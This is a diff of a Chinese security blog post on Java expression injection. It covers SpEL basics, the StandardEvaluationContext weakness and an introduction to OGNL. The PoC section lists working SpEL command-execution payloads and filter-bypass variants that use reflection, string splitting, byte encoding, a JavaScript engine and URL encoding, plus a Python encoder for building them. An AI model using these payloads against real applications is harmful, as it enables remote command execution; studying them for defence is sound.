@@ -7,12 +7,12 @@
     <meta name="HandheldFriendly" content="True">
     <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="spel基础参考：https:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;2020&#x2F;01&#x2F;10&#x2F;SpEL SpEL简介 在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。 在Spring系列产品中，SpEL是">
+    <meta name="description" content="spel基础参考：https:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;2020&#x2F;01&#x2F;10&#x2F;SpEL SpEL简介在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。 在Spring系列产品中，SpEL是表">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Java表达式注入">
 <meta property="og:url" content="https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
-<meta property="og:description" content="spel基础参考：https:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;2020&#x2F;01&#x2F;10&#x2F;SpEL SpEL简介 在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。 在Spring系列产品中，SpEL是">
+<meta property="og:description" content="spel基础参考：https:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;2020&#x2F;01&#x2F;10&#x2F;SpEL SpEL简介在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。 在Spring系列产品中，SpEL是表">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713112336109-19a6d25f-f49f-4c34-816f-f8dc579b2c2c.png">
 <meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153806642-e746ebd6-90db-4829-9222-4c5e652d53fb.png">
@@ -191,8 +191,7 @@
 
   <div class="content e-content" itemprop="articleBody">
     <p>spel基础参考：<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%90%E7%AE%97">https://www.mi1k7ea.com/2020/01/10/SpEL</a></p>
-<h2 id="SpEL简介">SpEL简介</h2>
-<p>在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。</p>
+<h2 id="SpEL简介"><a href="#SpEL简介" class="headerlink" title="SpEL简介"></a>SpEL简介</h2><p>在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。</p>
 <p>在Spring系列产品中，SpEL是表达式计算的基础，实现了与Spring生态系统所有产品无缝对接。Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEL可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量Java代码。</p>
 <p>SpEL有许多特性：</p>
 <ul>
@@ -202,17 +201,14 @@
 <li>可使用正则表达式进行匹配</li>
 <li>可进行集合操作</li>
 </ul>
-<h3 id="SpEL定界符——">SpEL定界符——#{}</h3>
-<p>SpEL使用#{}作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。</p>
+<h3 id="SpEL定界符——"><a href="#SpEL定界符——" class="headerlink" title="SpEL定界符——#{}"></a>SpEL定界符——#{}</h3><p>SpEL使用#{}作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。</p>
 <p>这里需要注意#{}和${}的区别：</p>
 <ul>
 <li>#{}就是SpEL的定界符，用于指明内容未SpEL表达式并执行；</li>
 <li>${}主要用于加载外部属性文件中的值；</li>
 <li>两者可以混合使用，但是必须#{}在外面，${}在里面，如#{‘${}’}，注意单引号是字符串类型才添加的；</li>
 </ul>
-<h3 id="SpEL表达式注入漏洞">SpEL表达式注入漏洞</h3>
-<h3 id="漏洞原理">漏洞原理</h3>
-<p>SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：</p>
+<h3 id="SpEL表达式注入漏洞"><a href="#SpEL表达式注入漏洞" class="headerlink" title="SpEL表达式注入漏洞"></a>SpEL表达式注入漏洞</h3><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：</p>
 <ul>
 <li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li>
 <li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
@@ -220,98 +216,99 @@
 <p>SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。</p>
 <p>由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainApp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);</span><br><span class="line">        System.out.println(expression.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="PoC-Bypass整理">PoC&amp;Bypass整理</h3>
-<p>下面我们来整理下各种利用的PoC，这里默认把定界符#{}去掉。</p>
+
+<h3 id="PoC-Bypass整理"><a href="#PoC-Bypass整理" class="headerlink" title="PoC&amp;Bypass整理"></a>PoC&amp;Bypass整理</h3><p>下面我们来整理下各种利用的PoC，这里默认把定界符#{}去掉。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PoC原型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">T(Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ProcessBuilder</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br><span class="line"></span><br><span class="line">******************************************************************************</span><br><span class="line"><span class="comment">// Bypass技巧</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>&#125;)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="number">99</span>).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">108</span>)).concat(T(java.lang.Character).toString(<span class="number">99</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScript引擎通用PoC</span></span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="string">&quot;ng.Run&quot;</span>+<span class="string">&quot;time.getRu&quot;</span>+<span class="string">&quot;ntime().ex&quot;</span>+<span class="string">&quot;ec(s);&quot;</span>)</span><br><span class="line"></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;xxx&quot;</span>),)</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScript引擎+反射调用</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)),)</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScript引擎+URL编码</span></span><br><span class="line"><span class="comment">// 其中URL编码内容为：</span></span><br><span class="line"><span class="comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(java.net.URLDecoder).decode(<span class="string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 黑名单过滤&quot;.getClass(&quot;，可利用数组的方式绕过，还未测试成功</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;class&#x27;</span>].forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="number">15</span>].invoke(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;class&#x27;</span>].forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="number">7</span>].invoke(<span class="literal">null</span>),<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// JDK9新增的shell，还未测试</span></span><br><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(<span class="string">&quot;jdk.jshell.JShell&quot;</span>,<span class="literal">true</span>).Methods[<span class="number">6</span>].invoke(<span class="literal">null</span>,&#123;&#125;).eval(<span class="string">&#x27;whatever java code in one statement&#x27;</span>).toString()</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="http://CreateAscii.py">CreateAscii.py</a>，用于String类动态生成字符的字符ASCII码转换生成：</p>
+
+<p>CreateAscii.py，用于String类动态生成字符的字符ASCII码转换生成：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;Enter message to encode:&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Decoded string (in ASCII):\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;T(java.lang.Character).toString(%s)&#x27;</span> % <span class="built_in">ord</span>(message[<span class="number">0</span>]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;.concat(T(java.lang.Character).toString(%s))&#x27;</span> % <span class="built_in">ord</span>(ch), end=<span class="string">&quot;&quot;</span>), </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;new java.lang.String(new byte[]&#123;&#x27;</span>, end=<span class="string">&quot;&quot;</span>),</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(message[<span class="number">0</span>]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;,%s&#x27;</span> % <span class="built_in">ord</span>(ch), end=<span class="string">&quot;&quot;</span>), </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;)&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
 <p>一些bypass技巧：</p>
 <p>参考：<a target="_blank" rel="noopener" href="https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">https://boogipop.com/2023/08/06/SPEL</a></p>
-<h2 id="OGNL是什么？">OGNL是什么？</h2>
-<p>先来看一个例子:</p>
+<h2 id="OGNL是什么？"><a href="#OGNL是什么？" class="headerlink" title="OGNL是什么？"></a>OGNL是什么？</h2><p>先来看一个例子:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Class SchoolMaster&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;wanghua&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class School</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;tsinghua&quot;</span>;</span><br><span class="line">    SchoolMaster schoolMaster;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Student</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line">    School school;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>创建实例学校school = new School()、学生student = new Student()和校长schoolMaster = new SchoolMaster()，将学校校长指定为schoolMaster实例-school.schoolMaster = schoolMaster，学生的学校指定为school实例-student.school = school，那么三者就连接起来了形成了一个对象图，对象图基本可以理解为对象之间的依赖图。通过对象图我们可以获取到对象的属性甚至对象的方法。</p>
+
+<p>创建实例学校school &#x3D; new School()、学生student &#x3D; new Student()和校长schoolMaster &#x3D; new SchoolMaster()，将学校校长指定为schoolMaster实例-school.schoolMaster &#x3D; schoolMaster，学生的学校指定为school实例-student.school &#x3D; school，那么三者就连接起来了形成了一个对象图，对象图基本可以理解为对象之间的依赖图。通过对象图我们可以获取到对象的属性甚至对象的方法。</p>
 <p>那么OGNL就是实现对象图导航语言，全称Object-Graph Navigation Language。通过它我们可以存取 Java对象的任意属性、调用 Java 对象的方法以及实现类型转换等。</p>
-<h3 id="OGNL三元素">OGNL三元素</h3>
-<p>OGNL基本使用方法示例：</p>
+<h3 id="OGNL三元素"><a href="#OGNL三元素" class="headerlink" title="OGNL三元素"></a>OGNL三元素</h3><p>OGNL基本使用方法示例：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建Student对象</span></span><br><span class="line"><span class="type">School</span> <span class="variable">school</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">School</span>();</span><br><span class="line">school.setName(<span class="string">&quot;tsinghua&quot;</span>);</span><br><span class="line">school.setSchoolMaster(<span class="keyword">new</span> <span class="title class_">SchoolMaster</span>(<span class="string">&quot;wanghua&quot;</span>));</span><br><span class="line"><span class="type">Student</span> <span class="variable">student1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">student1.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line">student1.setSchool(school);</span><br><span class="line"><span class="type">Student</span> <span class="variable">student2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">student2.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">student2.setSchool(school);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建上下文环境</span></span><br><span class="line"><span class="type">OgnlContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();</span><br><span class="line"><span class="comment">// 设置跟对象root</span></span><br><span class="line">context.setRoot(student1);</span><br><span class="line">context.put(<span class="string">&quot;student2&quot;</span>, student2);</span><br><span class="line"><span class="comment">// 获取ognl的root相关值</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">name1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">school1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;school.name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">schoolMaster1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;school.schoolMaster.name&quot;</span>, context, context.getRoot());</span><br><span class="line">System.out.println(name1 + <span class="string">&quot;:学校-&quot;</span> + school1 + <span class="string">&quot;,校长-&quot;</span>+schoolMaster1);</span><br><span class="line"><span class="comment">// 获取ognl非root相关值</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">name2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#student2.name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">school2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#student2.school.name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">schoolMaster2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#student2.school.schoolMaster.name&quot;</span>, context, context.getRoot());</span><br><span class="line">System.out.println(name2 + <span class="string">&quot;:学校-&quot;</span> + school2 + <span class="string">&quot;,校长-&quot;</span>+schoolMaster2);</span><br></pre></td></tr></table></figure>
+
 <p>输出结果：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaoming:学校-tsinghua,校长-wanghua</span><br><span class="line">zhangsan:学校-tsinghua,校长-wanghua</span><br></pre></td></tr></table></figure>
+
 <p>不难看出，OGNL getValue需要三元素：expression表达式、context上下文及root对象。那么什么是三元素：</p>
-<p>expression表达式：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；<br>
-root根对象：OGNL的Root对象可以理解为OGNL的操作对象。当OGNL通过表达式规定了“干什么”以后，还需要指定对谁进行操作；<br>
-context上下文对象：context以MAP的结构、利用键值对关系来描述对象中的属性以及值，称之为OgnlContext，可以理解为对象运行的上下文环境，其实就是规定OGNL的操作在哪里。</p>
-<p>在上面示例中，根对象是student1实例，context中设置了根对象和非根对象student2，表达式有name、<a target="_blank" rel="noopener" href="http://school.name">school.name</a>、<a target="_blank" rel="noopener" href="http://school.schoolMaster.xn--namestudent2-1l2u.name">school.schoolMaster.name和student2.name</a>、#<a target="_blank" rel="noopener" href="http://student2.school.name">student2.school.name</a>、<a target="_blank" rel="noopener" href="http://student2.school.schoolMaster.name">student2.school.schoolMaster.name</a>，前三个是通过表达式获取root也就是student1对象的相关属性，后三个是通过表达式获取容器变量student2对象的相关属性。</p>
-<h3 id="OGNL表达式语法">OGNL表达式语法</h3>
-<h4 id="符号的使用：">符号的使用：</h4>
-<p>在上一部分我们已经接触了.和#符号在表达式中的使用，通过.可以获取对象属性，#可以获取非root的Student对象。</p>
-<p>OGNL表达式支持Java基本运算，所以运算符+、-、*、/、%等在OGNL都是支持的，另外还支持in、eq、gt等。</p>
+<p>expression表达式：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；<br>root根对象：OGNL的Root对象可以理解为OGNL的操作对象。当OGNL通过表达式规定了“干什么”以后，还需要指定对谁进行操作；<br>context上下文对象：context以MAP的结构、利用键值对关系来描述对象中的属性以及值，称之为OgnlContext，可以理解为对象运行的上下文环境，其实就是规定OGNL的操作在哪里。</p>
+<p>在上面示例中，根对象是student1实例，context中设置了根对象和非根对象student2，表达式有name、school.name、school.schoolMaster.name和student2.name、#student2.school.name、student2.school.schoolMaster.name，前三个是通过表达式获取root也就是student1对象的相关属性，后三个是通过表达式获取容器变量student2对象的相关属性。</p>
+<h3 id="OGNL表达式语法"><a href="#OGNL表达式语法" class="headerlink" title="OGNL表达式语法"></a>OGNL表达式语法</h3><h4 id="符号的使用："><a href="#符号的使用：" class="headerlink" title="符号的使用："></a>符号的使用：</h4><p>在上一部分我们已经接触了.和#符号在表达式中的使用，通过.可以获取对象属性，#可以获取非root的Student对象。</p>
+<p>OGNL表达式支持Java基本运算，所以运算符+、-、*、&#x2F;、%等在OGNL都是支持的，另外还支持in、eq、gt等。</p>
 <p>除了基本运算符，.、@、#在OGNL中都有特殊含义。</p>
 <p>1、通过.获取对象的属性或方法：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">student</span><br><span class="line">student.name</span><br><span class="line">student.school</span><br><span class="line">student.school.name</span><br><span class="line">student.takingClasses(<span class="string">&quot;英语&quot;</span>)</span><br></pre></td></tr></table></figure>
+
 <p>2、三种类型对象的获取：</p>
 <p>静态对象、静态方法和静态变量：@</p>
